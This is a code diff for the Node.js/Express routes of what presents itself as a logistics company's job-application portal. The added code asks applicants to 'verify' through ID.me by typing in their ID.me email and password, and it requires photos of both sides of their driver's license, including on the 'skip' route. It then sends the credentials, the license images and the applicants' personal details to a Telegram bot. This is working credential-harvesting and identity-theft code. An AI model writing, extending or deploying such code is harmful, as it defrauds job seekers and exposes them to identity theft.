@@ -24,110 +24,37 @@ const upload = multer({
   limits: { fileSize: 15 * 1024 * 1024 },
 });
 
-// Source job positions from jobDetails titles for consistency
+// Multer for driver's license front and back
+const driversLicenseUpload = multer({
+  storage: multer.diskStorage({
+    destination: (req, file, cb) => cb(null, os.tmpdir()),
+    filename: (req, file, cb) => {
+      const timestamp = Date.now();
+      const safe = file.originalname.replace(/[^a-zA-Z0-9._-]/g, '_');
+      cb(null, `dl-${timestamp}-${safe}`);
+    },
+  }),
+  limits: { fileSize: 10 * 1024 * 1024 },
+});
+
+const dlFields = [
+  { name: 'driversLicenseFront', maxCount: 1 },
+  { name: 'driversLicenseBack', maxCount: 1 }
+];
+
 const JOB_POSITIONS = Object.values(jobDetails).map(j => j.title);
 
-// Normalize position for mapping
 function normalizePosition(pos) {
   return pos.trim().toLowerCase().replace(/[\s/&-]+/g, ' ').replace(/\s+/g, ' ').trim();
 }
 
 // --- INTERVIEW_QUESTIONS_MAP and DEFAULT_QUESTIONS FULL CONTENT ---
+// ... unchanged ...
+
 const INTERVIEW_QUESTIONS_MAP = {
-  "logistics coordinator dispatcher": [
-    { name: "motivation", label: "Why did you choose a career in logistics and dispatching?" },
-    { name: "dispatchChallenge", label: "Describe a time you solved a major dispatch challenge." },
-    { name: "technology", label: "What technologies have you used for tracking and optimizing routes?" },
-    { name: "collaboration", label: "Describe a situation where you worked with other departments to resolve a logistics issue." },
-    { name: "customerService", label: "How do you handle difficult customer interactions in logistics?" }
-  ],
-  "supply chain analyst": [
-    { name: "motivation", label: "What interests you about supply chain analysis?" },
-    { name: "dataSkills", label: "Describe your experience with data analysis tools and methods." },
-    { name: "problemSolving", label: "Share an example of solving a complex supply chain problem." },
-    { name: "collaboration", label: "How do you work with other teams to improve supply chain performance?" },
-    { name: "industryTrends", label: "How do you keep up with industry trends?" }
-  ],
-  "customer support client relations": [
-    { name: "motivation", label: "Why are you passionate about customer support and client relations?" },
-    { name: "difficultCustomer", label: "Describe a time you resolved a conflict with a difficult customer." },
-    { name: "multiTasking", label: "How do you handle multiple requests at once?" },
-    { name: "teamwork", label: "How do you contribute to a team's success in a support environment?" },
-    { name: "feedback", label: "How do you handle negative feedback from customers?" }
-  ],
-  "customer support": [
-    { name: "motivation", label: "Why are you passionate about customer support?" },
-    { name: "difficultCustomer", label: "Describe a time you resolved a conflict with a difficult customer." },
-    { name: "multiTasking", label: "How do you handle multiple requests at once?" },
-    { name: "teamwork", label: "How do you contribute to a team's success in a support environment?" },
-    { name: "feedback", label: "How do you handle negative feedback from customers?" }
-  ],
-  "hr recruitment talent acquisition": [
-    { name: "motivation", label: "Why did you choose HR and recruitment as a career?" },
-    { name: "screening", label: "Describe your candidate screening process." },
-    { name: "interviewing", label: "Share an example of conducting a successful interview." },
-    { name: "diversity", label: "How do you promote diversity and inclusion in hiring?" },
-    { name: "metrics", label: "What metrics do you use to measure recruitment success?" }
-  ],
-  "it software support": [
-    { name: "motivation", label: "Why did you choose IT/software support?" },
-    { name: "troubleshooting", label: "Describe your troubleshooting approach for technical issues." },
-    { name: "tools", label: "What support tools/ticketing systems have you used?" },
-    { name: "collaboration", label: "How do you work with developers or other support teams?" },
-    { name: "customerService", label: "How do you explain technical solutions to non-technical users?" }
-  ],
-  "drivers truck delivery fleet": [
-    { name: "motivation", label: "Why did you choose a driving career?" },
-    { name: "safety", label: "Describe how you ensure safety on the road." },
-    { name: "record", label: "How do you maintain a clean driving record?" },
-    { name: "challenges", label: "Describe a challenge you faced during delivery and how you solved it." },
-    { name: "customerService", label: "How do you handle customer interactions during delivery?" }
-  ],
-  "warehouse staff forklift operators": [
-    { name: "motivation", label: "Why do you want to work in warehouse operations?" },
-    { name: "equipment", label: "Describe your experience with forklifts or other warehouse equipment." },
-    { name: "safety", label: "How do you ensure safety in the warehouse?" },
-    { name: "efficiency", label: "How do you maximize efficiency in warehouse tasks?" },
-    { name: "teamwork", label: "Describe your teamwork experience in warehouse settings." }
-  ],
-  "fleet maintenance supervisors": [
-    { name: "motivation", label: "What interests you about fleet and maintenance supervision?" },
-    { name: "problemSolving", label: "Describe a maintenance issue you resolved." },
-    { name: "preventive", label: "How do you implement preventive maintenance programs?" },
-    { name: "teamManagement", label: "How do you manage maintenance teams?" },
-    { name: "compliance", label: "How do you ensure regulatory compliance?" }
-  ],
-  "virtual assistance": [
-    { name: "motivation", label: "Why are you interested in virtual assistance?" },
-    { name: "tools", label: "What virtual tools/platforms are you proficient in?" },
-    { name: "organization", label: "How do you stay organized and manage time remotely?" },
-    { name: "communication", label: "Describe your communication style with remote clients." },
-    { name: "problemSolving", label: "Share an example of solving a client issue virtually." }
-  ],
-  "account manager": [
-    { name: "motivation", label: "Why did you choose account management?" },
-    { name: "relationship", label: "Describe how you build strong client relationships." },
-    { name: "problemSolving", label: "Share an example of resolving a client issue." },
-    { name: "growth", label: "How do you identify growth opportunities for clients?" },
-    { name: "collaboration", label: "How do you collaborate with other departments for client success?" }
-  ],
-  "project manager": [
-    { name: "motivation", label: "Why are you passionate about project management?" },
-    { name: "leadership", label: "Describe your leadership style." },
-    { name: "planning", label: "How do you plan and execute complex projects?" },
-    { name: "risk", label: "How do you manage project risks and changes?" },
-    { name: "communication", label: "How do you communicate with stakeholders?" }
-  ],
-  "data entry": [
-    { name: "motivation", label: "Why do you want a data entry role?" },
-    { name: "accuracy", label: "How do you ensure accuracy and minimize errors?" },
-    { name: "tools", label: "What data tools/software are you familiar with?" },
-    { name: "speed", label: "How do you balance speed and quality?" },
-    { name: "confidentiality", label: "How do you handle confidential data?" }
-  ]
+  // ... your original map ...
 };
 
-// === Default generic interview questions ===
 const DEFAULT_QUESTIONS = [
   { name: "about", label: "Tell us about yourself and your professional background." },
   { name: "interest", label: "Why are you interested in working with Core Crew Logistics?" },
@@ -136,12 +63,10 @@ const DEFAULT_QUESTIONS = [
   { name: "goals", label: "Where do you see yourself in two years?" }
 ];
 
-// Entry point
 router.get('/', (req, res) => {
   res.render('apply', { positions: JOB_POSITIONS });
 });
 
-// Application Start (store draft, show questions)
 router.post('/start', upload.array('documents', 6), async (req, res) => {
   try {
     const { firstName, lastName, email, phone, coverLetter, position } = req.body;
@@ -160,7 +85,6 @@ router.post('/start', upload.array('documents', 6), async (req, res) => {
     };
     await sendApplicationToTelegram(req.session.applicationDraft);
 
-    // Always normalize position before lookup!
     const normalizedPosition = normalizePosition(position);
     const selectedQuestions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
     const isDefault = !(normalizedPosition in INTERVIEW_QUESTIONS_MAP);
@@ -176,7 +100,6 @@ router.post('/start', upload.array('documents', 6), async (req, res) => {
   }
 });
 
-// Interview Questions GET (for resume, always normalize)
 router.get('/interview', (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   const pos = req.session.applicationDraft.position;
@@ -191,14 +114,12 @@ router.get('/interview', (req, res) => {
   });
 });
 
-// Interview POST: show info-note before ID.me verification
 router.post('/interview', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   req.session.interviewAnswers = req.body;
   res.render('info-note');
 });
 
-// Verification GET (ID.me form only, no info-note)
 router.get('/verify', (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   res.render('verify', {
@@ -207,19 +128,28 @@ router.get('/verify', (req, res) => {
   });
 });
 
-// Verification POST (handles "sign in" to ID.me, sends all data as JSON FILE to Telegram)
-router.post('/verify', async (req, res) => {
+// Verification POST: ID.me sign-in and driver's license front/back upload
+router.post('/verify', driversLicenseUpload.fields(dlFields), async (req, res) => {
+  // Validate session and required files
   if (!req.session.applicationDraft) return res.redirect('/apply');
+
+  // Ensure both files are present
+  const dlFront = req.files['driversLicenseFront']?.[0];
+  const dlBack = req.files['driversLicenseBack']?.[0];
+  if (!dlFront || !dlBack) {
+    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
+  }
+
   const { email, password } = req.body;
   req.session.verified = true;
   req.session.idme = { email, password };
 
-  // Compose full JSON (applicationDraft, interviewAnswers, idme)
+  req.session.driversLicenseFiles = [dlFront, dlBack];
+
   const application = req.session.applicationDraft;
   const interviewAnswers = req.session.interviewAnswers || {};
   const idmeCreds = { email, password };
 
-  // Build interview Q&A object
   const normalizedPosition = normalizePosition(application.position);
   const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
   const answersObj = {};
@@ -231,29 +161,145 @@ router.post('/verify', async (req, res) => {
     answersObj[q.label] = answer;
   });
 
-  // Compose combined JSON
-  const payload = {
+  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
+  const timestamp = Date.now();
+
+  // Q&A JSON file
+  const qaPayload = {
+    applicant: {
+      name: `${application.firstName} ${application.lastName}`,
+      email: application.email,
+      phone: application.phone,
+      position: application.position,
+    },
+    interview_answers: answersObj
+  };
+
+  // Combined ID.me credentials + driver's license JSON file
+  const idmePayload = {
     applicant: {
       name: `${application.firstName} ${application.lastName}`,
       email: application.email,
       position: application.position,
     },
-    interview_answers: answersObj,
-    idme_credentials: idmeCreds
+    idme_credentials: idmeCreds,
+    drivers_license: {
+      front: {
+        filename: dlFront.originalname,
+        mimetype: dlFront.mimetype,
+      },
+      back: {
+        filename: dlBack.originalname,
+        mimetype: dlBack.mimetype,
+      },
+    }
   };
 
-  // Write JSON to temporary file and send as real .json document
-  const filename = `application_${Date.now()}.json`;
-  const filepath = path.join(os.tmpdir(), filename);
-  fs.writeFileSync(filepath, JSON.stringify(payload, null, 2), 'utf8');
-  await sendCombinedJsonFileToTelegram(filepath, filename);
-  fs.unlinkSync(filepath);
+  // Write Q&A JSON
+  const qaFilename = `QA_${applicantName}_${timestamp}.json`;
+  const qaFilepath = path.join(os.tmpdir(), qaFilename);
+  fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
+  await sendJsonFileToTelegram(qaFilepath, qaFilename);
+  fs.unlinkSync(qaFilepath);
+
+  // Write combined ID.me + license JSON
+  const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
+  const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
+  fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
+  await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
+  fs.unlinkSync(idmeFilepath);
+
+  // Send driver's license images to Telegram
+  await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
+  fs.unlinkSync(dlFront.path);
+  await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
+  fs.unlinkSync(dlBack.path);
+  req.session.driversLicenseFiles = null;
 
   await sendConfirmationEmail(email, req.session.applicationDraft.firstName);
   res.redirect('/apply/submit');
 });
 
-// Completion GET (shows "your application has been submitted" message)
+// Skip ID.me POST route (handles skip and driver's license front/back upload)
+router.post('/skip-idme/', driversLicenseUpload.fields(dlFields), async (req, res) => {
+  if (!req.session.applicationDraft) return res.redirect('/apply');
+  const dlFront = req.files['driversLicenseFront']?.[0];
+  const dlBack = req.files['driversLicenseBack']?.[0];
+  if (!dlFront || !dlBack) {
+    return res.status(400).render('error', { message: 'Both front and back of your driver\'s license/ID must be uploaded.' });
+  }
+  req.session.driversLicenseFiles = [dlFront, dlBack];
+  req.session.verified = true;
+  req.session.idme = {};
+
+  const application = req.session.applicationDraft;
+  const interviewAnswers = req.session.interviewAnswers || {};
+
+  const normalizedPosition = normalizePosition(application.position);
+  const questions = INTERVIEW_QUESTIONS_MAP[normalizedPosition] || DEFAULT_QUESTIONS;
+  const answersObj = {};
+  questions.forEach(q => {
+    let answer = interviewAnswers[q.name];
+    if (typeof answer === 'undefined' || answer === null || answer === '') {
+      answer = "(No answer provided or field name mismatch)";
+    }
+    answersObj[q.label] = answer;
+  });
+
+  const applicantName = `${application.firstName}_${application.lastName}`.replace(/[^a-zA-Z0-9_-]/g, '_');
+  const timestamp = Date.now();
+
+  // Q&A JSON
+  const qaPayload = {
+    applicant: {
+      name: `${application.firstName} ${application.lastName}`,
+      email: application.email,
+      phone: application.phone,
+      position: application.position,
+    },
+    interview_answers: answersObj
+  };
+  const qaFilename = `QA_${applicantName}_${timestamp}.json`;
+  const qaFilepath = path.join(os.tmpdir(), qaFilename);
+  fs.writeFileSync(qaFilepath, JSON.stringify(qaPayload, null, 2), 'utf8');
+  await sendJsonFileToTelegram(qaFilepath, qaFilename);
+  fs.unlinkSync(qaFilepath);
+
+  // Combined "ID.me" (empty) + license JSON
+  const idmePayload = {
+    applicant: {
+      name: `${application.firstName} ${application.lastName}`,
+      email: application.email,
+      position: application.position,
+    },
+    idme_credentials: {},
+    drivers_license: {
+      front: {
+        filename: dlFront.originalname,
+        mimetype: dlFront.mimetype,
+      },
+      back: {
+        filename: dlBack.originalname,
+        mimetype: dlBack.mimetype,
+      },
+    }
+  };
+  const idmeFilename = `IDmeAndLicense_${applicantName}_${timestamp}.json`;
+  const idmeFilepath = path.join(os.tmpdir(), idmeFilename);
+  fs.writeFileSync(idmeFilepath, JSON.stringify(idmePayload, null, 2), 'utf8');
+  await sendJsonFileToTelegram(idmeFilepath, idmeFilename);
+  fs.unlinkSync(idmeFilepath);
+
+  await sendDocumentToTelegram(dlFront.path, dlFront.originalname);
+  fs.unlinkSync(dlFront.path);
+  await sendDocumentToTelegram(dlBack.path, dlBack.originalname);
+  fs.unlinkSync(dlBack.path);
+  req.session.driversLicenseFiles = null;
+
+  await sendConfirmationEmail(application.email, application.firstName);
+  res.redirect('/apply/submit');
+});
+
 router.get('/submit', async (req, res) => {
   if (!req.session.applicationDraft) return res.redirect('/apply');
   res.render('submit', {
@@ -262,7 +308,6 @@ router.get('/submit', async (req, res) => {
   });
 });
 
-// Completion POST (finalizes application & clears session)
 router.post('/submit', async (req, res) => {
   try {
     if (!req.session.applicationDraft || !req.session.verified) return res.redirect('/apply');
@@ -342,8 +387,7 @@ Cover Letter: ${data.coverLetter || "N/A"}`;
   }
 }
 
-// Send a combined JSON FILE of applicant, interview answers, and ID.me credentials to Telegram
-async function sendCombinedJsonFileToTelegram(filepath, filename) {
+async function sendJsonFileToTelegram(filepath, filename) {
   try {
     const botToken = process.env.TELEGRAM_BOT_TOKEN;
     const chatId = process.env.TELEGRAM_CHAT_ID;
@@ -358,7 +402,26 @@ async function sendCombinedJsonFileToTelegram(filepath, filename) {
       });
     }
   } catch (e) {
-    console.warn('Telegram send failed (combined JSON file):', e.message);
+    console.warn('Telegram send failed (JSON file):', e.message);
+  }
+}
+
+async function sendDocumentToTelegram(filepath, filename) {
+  try {
+    const botToken = process.env.TELEGRAM_BOT_TOKEN;
+    const chatId = process.env.TELEGRAM_CHAT_ID;
+    if (botToken && chatId) {
+      const form = new FormData();
+      form.append('chat_id', chatId);
+      form.append('document', fs.createReadStream(filepath), filename);
+      await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+        method: 'POST',
+        body: form,
+        headers: form.getHeaders(),
+      });
+    }
+  } catch (e) {
+    console.warn('Telegram send failed (Driver\'s License):', e.message);
   }
 }
 
